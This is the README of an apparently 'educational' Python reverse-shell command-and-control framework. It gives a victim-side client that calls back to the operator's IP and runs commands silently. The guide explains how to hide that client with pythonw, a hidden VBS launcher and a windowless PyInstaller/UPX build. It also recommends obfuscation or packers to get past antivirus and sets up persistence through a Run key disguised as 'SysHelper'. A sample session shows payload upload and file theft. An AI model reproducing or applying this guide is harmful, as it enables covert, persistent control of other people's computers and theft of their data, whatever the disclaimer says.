# 🧠 Reverse C2 Framework (Educational – Silent Client)

> **⚠️ WARNING: This tool is for EDUCATIONAL and AUTHORIZED SECURITY TESTING only.**  
> Unauthorised access is illegal. Use only on networks and devices you own or have explicit written permission to test.

A lightweight, reverse‑shell Command & Control (C2) framework written in Python.  
The **server** runs on your machine and provides an interactive console. The **client** runs silently on the target – it connects back to you, executes commands, and sends output **without displaying anything** to the victim.

---

## ✨ Features

- **Reverse connection** – client initiates the connection, making firewalls easier to bypass.
- **Silent client** – no console, no prompts, no printed text; perfect for stealth.
- **Multi‑client support** – server can manage many victims simultaneously via threads.
- **Remote command execution** – run any system command on the victim.
- **File upload/download** – push files to the victim or pull files from it (with size‑prefixed headers).
- **Heartbeat / timeouts** – keeps connections alive and cleans up dead clients.
- **Stealth deployment** – can be run with `pythonw.exe`, via VBS, or compiled to a windowless `.exe`.

---

## 📁 File Structure

```
.
├── server.py          # Operator console – run this on your machine
├── client.py          # Silent agent – runs on the victim's machine
├── silent_start.bat   # (Optional) Launches client with pythonw.exe
├── invisible.vbs      # (Optional) Launches client with no window
└── README.md          # This file
```

---

## 🖥️ Server – Your Command Console

The server listens for incoming connections and gives you an interactive prompt.

### Start the server
```bash
python server.py
```
*By default it binds to `0.0.0.0:4444` – you can change the port inside the code.*

### Available server commands

| Command | Description |
| :------ | :---------- |
| `list` | Show all connected victims with their IDs. |
| `select <id>` | Choose a victim to control (e.g., `select 1`). |
| `<any shell command>` | Runs on the selected victim (e.g., `whoami`, `dir C:\`). |
| `upload <local_file> <remote_path>` | Push a file from your machine to the victim. |
| `download <remote_file> <local_path>` | Pull a file from the victim to your machine. |
| `exit` | Shut down the server. |

**Example session:**
```
C2> list
Connected victims:
  #1 - ('192.168.1.50', 54321)
  #2 - ('10.0.0.5', 12345)

C2> select 1
[*] Now controlling victim #1

C2> whoami
desktop-victim\admin

C2> upload C:\tools\payload.exe C:\Users\Public\payload.exe
[*] Uploaded C:\tools\payload.exe to victim as C:\Users\Public\payload.exe

C2> download C:\secret\data.txt ./stolen_data.txt
[*] Downloaded C:\secret\data.txt from victim to ./stolen_data.txt
```

---

## 🤫 Client – The Silent Agent

The client is designed to run **without any visible feedback** on the victim's machine. It connects to your server and waits for commands.

### Configuration
Edit the `client.py` file to hardcode your server IP and port, or pass them as command‑line arguments:

```bash
python client.py 192.168.1.100 4444
```

### Making the client truly invisible

Because the victim should never see a terminal window, use one of these three methods:

---

#### 🅰️ Method 1: Use `pythonw.exe` (Windows only)

`pythonw.exe` runs Python **without a console window**. Create a batch file `silent_start.bat`:

```batch
@echo off
start /B pythonw.exe client.py 192.168.1.100 4444
exit
```
- `start /B` runs it in the background.
- Double‑clicking this `.bat` will launch the client with no visible window.

---

#### 🅱️ Method 2: Use a VBS script (even stealthier)

Create `invisible.vbs`:

```vbs
CreateObject("WScript.Shell").Run "pythonw.exe client.py 192.168.1.100 4444", 0, False
```
- The `0` hides the window completely.
- Run this script – the client starts with absolutely zero UI.

---

#### 🅲 Method 3: Compile to a standalone `.exe` (Recommended)

This method packages the client into a single `.exe` file that **does not require Python** on the target machine. You can also make it completely windowless.

**Step 1 – Install PyInstaller** (on your dev machine):
```bash
pip install pyinstaller
```

**Step 2 – Build the silent `.exe`**:
```bash
pyinstaller --onefile --noconsole client.py
```
- `--onefile` creates a single `.exe` (easier to distribute).
- `--noconsole` ensures that **no terminal window** appears when the `.exe` is run.

**Step 3 – Find the `.exe`**:
After the build finishes, the executable will be located at:
```
dist\client.exe
```

**Step 4 – Run it on the victim**:
Simply double‑click `client.exe` – it will connect to your server silently. No window, no prompts, no traces (except in Task Manager as a normal process).

> 💡 *If you want to reduce the file size, you can compress the `.exe` with **UPX**:*  
> `pyinstaller --onefile --noconsole --upx-dir="C:\upx" client.py`

---

## 🧩 How It Works (The Big Picture)

1. **You start the server** on your machine (e.g., `python server.py`).
2. **Victim runs the silent client** (via any of the above methods).  
   The client connects to your server’s IP and port.
3. On your server, you see a new victim appear (you can use `list`).
4. You **select** a victim, then type commands.  
   The server forwards your command to the client.
5. The client executes the command locally (using `subprocess`) and sends the output back to you.
6. For file transfers, a size‑prefixed protocol ensures reliable binary transfer.

All traffic is **plain TCP** – no encryption (add TLS if you want to secure it).

---

## 🛡️ Limitations & Security Warnings

- **No encryption** – everything is sent in clear text.  
- **No authentication** – anyone who can reach your server port can connect.  
- **Shell injection** – the client uses `shell=True` – only use in lab environments.  
- **OS‑dependent** – commands must match the victim’s OS (Windows vs Linux).  
- **Anti‑virus** – compiled `.exe`s may be flagged by AV; this is expected for C2 tools.

---

## ❓ Troubleshooting

| Issue | Solution |
| :---- | :------- |
| `ConnectionRefusedError` on client | Server not running, wrong IP/port, or firewall blocking. |
| Client disconnects immediately | Check that the server IP and port are correct. Use `ping` to test reachability. |
| No output from commands | The victim might be offline or the command produced no stdout. Try `dir` or `whoami`. |
| `python` not found when using `.bat` | Use `py` instead of `python`, or provide the full path to `python.exe`. |
| `.exe` is flagged by antivirus | This is normal for remote admin tools. Use code obfuscation or packers if needed. |

---

## 📦 Bonus: Persistence (Optional)

If you want the client to **survive reboots**, you can add it to the Windows Startup folder or the Registry. For example, place the `.exe` in:

```
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
```
Or add a Registry run key:
```batch
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "SysHelper" /t REG_SZ /d "C:\path\to\client.exe"
```

---

## 📜 License & Disclaimer

This project is provided under the **MIT License** for **educational purposes only**.  
The author does not condone illegal use and assumes no liability for any damage or misuse.

---

*Stay ethical, stay legal, and only test what you own or have permission to test.* 🔐
